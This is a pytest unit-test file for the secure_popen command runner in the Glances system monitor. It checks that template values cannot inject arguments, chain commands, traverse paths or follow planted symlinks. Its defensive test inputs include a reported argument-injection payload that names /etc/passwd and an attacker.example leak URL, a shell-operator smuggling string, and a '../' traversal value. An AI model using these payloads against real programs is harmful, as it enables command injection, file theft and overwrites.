#!/usr/bin/env python
#
# Glances - An eye on your system
#
# SPDX-FileCopyrightText: 2024 Nicolas Hennion <nicolas@nicolargo.com>
#
# SPDX-License-Identifier: LGPL-3.0-only
#

"""Glances unit tests for secure_popen (glances.secure).

Tests cover:
- secure_popen basic functionality (chain, pipe, redirect)
- Mustache fields land in exactly one argv slot (GHSA-56xw-p9qm-r437)
"""

import os
import tempfile
from unittest.mock import MagicMock, patch

import pytest

from glances.secure import secure_popen

# Skip the whole module on Windows where echo -n behaves differently
pytestmark = pytest.mark.skipif(
    os.name == 'nt',
    reason='Shell command tests are POSIX-only',
)


# ---------------------------------------------------------------------------
# Tests – secure_popen basic functionality
# ---------------------------------------------------------------------------


class TestSecurePopen:
    """Basic tests for secure_popen."""

    def test_simple_echo(self):
        assert secure_popen('echo -n TEST') == 'TEST'

    def test_chained_commands(self):
        assert secure_popen('echo -n A && echo -n B') == 'AB'

    def test_pipe(self):
        result = secure_popen('echo FOO | grep FOO')
        assert 'FOO' in result

    def test_redirect_to_file(self):
        with tempfile.NamedTemporaryFile(mode='r', suffix='.txt', delete=False) as f:
            tmpfile = f.name
        try:
            secure_popen(f'echo -n HELLO > {tmpfile}')
            with open(tmpfile) as f:
                assert f.read() == 'HELLO'
        finally:
            os.unlink(tmpfile)


class _FakeProcess:
    """Minimal Popen stand-in: no output, no exit status."""

    def __init__(self):
        self.stdout = MagicMock()

    def communicate(self, timeout=None):
        return (b'', b'')

    def wait(self, timeout=None):
        return 0


# ---------------------------------------------------------------------------
# Tests – argument injection through Mustache values (GHSA-56xw-p9qm-r437)
# ---------------------------------------------------------------------------

# The reported payload: a literal single quote closes the quoted Mustache field
# early, then three fully attacker-controlled argv tokens follow.
_POC_VALUE = "/mnt/usb/x' --evil-flag /etc/passwd http://attacker.example/leak 'y"


class TestSecurePopenRender:
    """secure_popen(render=...) confines a rendered value to one argument.

    These bear on glances.secure alone: the protection must not depend on
    _sanitize_mustache_dict(), which is kept only as defence in depth.
    """

    @staticmethod
    def _render(value):
        """A render callable that expands the single field '{{v}}'."""
        return lambda arg: arg.replace('{{v}}', value)

    def _capture(self, cmd, value, **kwargs):
        argv_list = []

        def fake_popen(argv, **kw):
            argv_list.append(argv)
            return _FakeProcess()

        with patch('glances.secure.Popen', side_effect=fake_popen):
            secure_popen(cmd, render=self._render(value), **kwargs)

        return argv_list

    def test_operators_in_the_value_are_never_interpreted(self):
        """Even unsanitized, a value cannot chain, pipe or redirect: the
        operators are split off the template before the value exists."""
        value = "a && b | c > /tmp/evil"
        assert self._capture('echo {{v}}', value) == [['echo', value]]

    def test_quotes_in_the_value_cannot_break_out(self):
        assert self._capture("echo '{{v}}'", _POC_VALUE) == [['echo', _POC_VALUE]]

    def test_whitespace_in_the_value_cannot_split(self):
        assert self._capture('echo {{v}}', 'one two three') == [['echo', 'one two three']]

    def test_render_is_not_applied_when_omitted(self):
        """Callers that pass no render (AMP, virsh, multipass) are unchanged."""
        argv_list = []

        def fake_popen(argv, **kw):
            argv_list.append(argv)
            return _FakeProcess()

        with patch('glances.secure.Popen', side_effect=fake_popen):
            secure_popen('echo {{v}}')

        assert argv_list == [['echo', '{{v}}']]


# ---------------------------------------------------------------------------
# Tests – security audit 2026-10-17 (X-1, X-6, X-11)
# ---------------------------------------------------------------------------


def _sleepers(marker):
    import psutil

    return [p for p in psutil.process_iter(["cmdline"]) if (p.info["cmdline"] or [])[:2] == ["sleep", marker]]


def test_a_stage_that_cannot_start_kills_the_stages_already_started():
    """X-1: `cat big | grp ERROR` (typo) left `cat` running, as root, once per alert cycle."""
    marker = "31337"
    with pytest.raises(FileNotFoundError):
        secure_popen(f"sleep {marker} | no_such_command_zzz")
    assert _sleepers(marker) == []


def test_children_read_nothing_from_the_terminal():
    """X-11: a configured `cat` competed with the TUI for stdin."""
    assert secure_popen("cat", timeout=5) == ""


def test_runs_of_whitespace_are_separators_not_arguments():
    """X-6: two spaces or a tab became an argument of their own."""
    assert secure_popen("echo -n A\t\tB  C") == "A B C"


# ---------------------------------------------------------------------------
# Tests – redirection target (security audit 2026-10-17, A4 / M5 / X-4)
# ---------------------------------------------------------------------------


def _render_name(value):
    return lambda arg: arg.replace('{{name}}', value)


def test_rendered_value_cannot_leave_the_target_folder(tmp_path):
    """M5: `name="../victim/owned"` wrote `victim/owned.log` outside `logs/`."""
    (tmp_path / 'logs').mkdir()
    ret = secure_popen(f'echo -n owned > {tmp_path}/logs/{{{{name}}}}.log', render=_render_name('../victim/owned'))
    assert ret.startswith('Glances error:')
    assert not (tmp_path / 'victim').exists()
    assert list((tmp_path / 'logs').iterdir()) == []


def test_rendered_value_cannot_contain_a_nul(tmp_path):
    ret = secure_popen(f'echo -n x > {tmp_path}/{{{{name}}}}.log', render=_render_name('a\x00b'))
    assert ret.startswith('Glances error:')


def test_rendered_value_still_picks_a_file_name(tmp_path):
    secure_popen(f'echo -n ALERT > {tmp_path}/gl_{{{{name}}}}.alert', render=_render_name('disk 1'))
    assert (tmp_path / 'gl_disk 1.alert').read_text() == 'ALERT'


def test_a_planted_symlink_is_not_followed(tmp_path):
    """M5: `logs/alert.log -> victim/secret.txt` was followed and the victim overwritten."""
    victim = tmp_path / 'secret.txt'
    victim.write_text('SECRET')
    link = tmp_path / 'alert.log'
    link.symlink_to(victim)
    with pytest.raises(OSError):
        secure_popen(f'echo -n owned > {link}')
    assert victim.read_text() == 'SECRET'


def test_append_redirection(tmp_path):
    """X-4: the shipped examples used `>>`, which secure_popen refused."""
    target = tmp_path / 'out.log'
    secure_popen(f'echo -n A >> {target}')
    secure_popen(f'echo -n B >> {target}')
    assert target.read_text() == 'AB'
    secure_popen(f'echo -n C > {target}')
    assert target.read_text() == 'C'


def test_only_one_redirection_per_command(tmp_path):
    assert secure_popen(f'echo -n A > {tmp_path}/a >> {tmp_path}/b').startswith('Glances error:')
    assert secure_popen(f'echo -n A >>> {tmp_path}/a').startswith('Glances error:')
    assert not (tmp_path / 'a').exists()


def test_new_redirection_file_is_private(tmp_path):
    target = tmp_path / 'out.log'
    secure_popen(f'echo -n A > {target}')
    assert target.stat().st_mode & 0o777 == 0o600
